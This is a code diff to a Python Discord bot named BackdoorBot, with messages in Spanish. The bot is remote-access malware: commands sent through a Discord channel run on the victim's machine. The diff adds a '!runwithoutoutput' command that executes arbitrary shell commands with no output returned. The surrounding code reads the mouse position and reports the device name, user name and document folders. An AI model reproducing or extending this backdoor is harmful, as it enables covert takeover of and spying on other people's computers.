@@ -161,6 +161,20 @@ class BackdoorBot(discord.Client):
                 await message.channel.send(f"Salida del comando:\n{output[:1900]}...")
             except subprocess.CalledProcessError as e:
                 await message.channel.send(f"Error al ejecutar el comando:\n{e.output[:1900]}...")
+        
+        elif message.content.startswith("!runwithoutoutput"):
+            parts = message.content.split(" ", 1)
+            if len(parts) < 2 or not parts[1].strip():
+                await message.channel.send("Por favor, proporciona un comando para ejecutar.")
+                return
+            command = parts[1]
+
+            await message.channel.send(f"Ejecutando comando")
+            try:
+                output = subprocess.Popen(command, shell=True)
+                await message.channel.send(f"Listo")
+            except subprocess.CalledProcessError as e:
+                await message.channel.send(f"Error al ejecutar el comando:\n{e.output[:1900]}...")
                 
         elif message.content.startswith("!getmousepos"):
             x, y = pyautogui.position()
@@ -388,7 +402,6 @@ class BackdoorBot(discord.Client):
             await message.channel.send(f"Descargas: {downloads_folder}")
         elif message.content.startswith("!info"):
             await message.channel.send("Version " + app_version +"\n Conectado a " + DEVICE_NAME + "\n Usuario: " + USER_NAME + "\n Carpeta de descargas: " + get_downloads_folder() + "\n Carpeta de documentos: " + get_documents_folder())
-        elif message.content.startswith("!")
             
 
 
